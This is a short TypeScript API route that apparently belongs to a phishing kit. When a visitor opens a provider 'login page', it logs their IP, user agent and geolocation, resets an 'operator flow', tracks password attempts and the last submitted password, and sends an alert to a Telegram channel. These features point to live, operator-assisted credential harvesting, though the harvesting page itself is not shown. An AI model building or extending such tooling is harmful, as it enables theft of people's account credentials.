import {
  assertConsent,
  ensureSession,
  getClientIp,
  getSessionId,
  jsonWithSession,
} from "@/lib/server/request";
import { resolveAndCacheSessionLocation } from "@/lib/server/geolocation";
import {
  appendSubmission,
  resetOperatorFlow,
  upsertSession,
} from "@/lib/server/store";
import { notifyTelegramIncoming } from "@/lib/server/telegram";

type Body = {
  provider?: string;
};

export async function POST(request: Request) {
  const sessionId = await getSessionId();
  const denied = await assertConsent(sessionId);
  if (denied) return denied;

  const body = (await request.json()) as Body;
  const ip = getClientIp(request);
  const userAgent = request.headers.get("user-agent") ?? undefined;

  await ensureSession(sessionId);

  const provider = body.provider ?? "UNKNOWN";

  // Login page opened again — reset operator flow and alert each time.
  await resetOperatorFlow(sessionId);
  await upsertSession(sessionId, {
    provider,
    ip,
    userAgent,
    passwordAttempts: 0,
    lastSubmittedPassword: undefined,
  });

  await resolveAndCacheSessionLocation(sessionId, ip);

  appendSubmission({
    sessionId,
    type: "notify",
    provider,
    ip,
  });

  try {
    await notifyTelegramIncoming(sessionId, provider);
  } catch (error) {
    console.error("Telegram incoming notification failed:", error);
  }

  return jsonWithSession({ success: true }, sessionId);
}
